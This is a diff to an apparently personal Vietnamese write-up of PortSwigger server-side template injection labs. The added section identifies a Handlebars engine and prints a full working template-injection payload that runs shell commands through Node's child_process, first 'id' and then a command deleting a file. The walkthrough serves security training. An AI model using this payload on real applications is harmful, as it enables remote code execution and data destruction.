@@ -1,4 +1,4 @@
-la# [Portswigger] Server-side template injection
+<img width="601" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/2164a526-55b3-40b7-b0a8-c30eeaa3c42e"># [Portswigger] Server-side template injection
 
 ![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/3e6623ba-fc70-4e15-8d32-364d0918eb22)
 
@@ -109,3 +109,67 @@ Kết qủa response trả về:
 LAB SOLVED!
 
 <img width="595" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/4cf25a48-9f68-4d2d-be16-e83c8b0b993c">
+
+***
+
+## 4. 
+
+* Content:
+
+* Exploit:
+
+Ban đầu thử nghiệm payload: `{{7/0}}` => Sinh ra exception:
+
+<img width="601" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/dcce3618-5987-44a2-9bd7-0c5d474bd51b">
+
+Qua đó xác đinh được template engine đang sử dụng là `handlebars`
+
+Áp dụng payload:
+```
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').execSync('id');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+```
+<img width="629" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/8c4718de-b18b-4fa1-9a45-32c65685a8b0">
+
+Thay bằng command xóa file theo yêu cầu:
+```
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').execSync('rm /home/carlos/morale.txt');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+```
+<img width="580" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/61fa6cbf-a6a0-4308-b14d-c183b4685d63">
+
+LAB SOLVED!
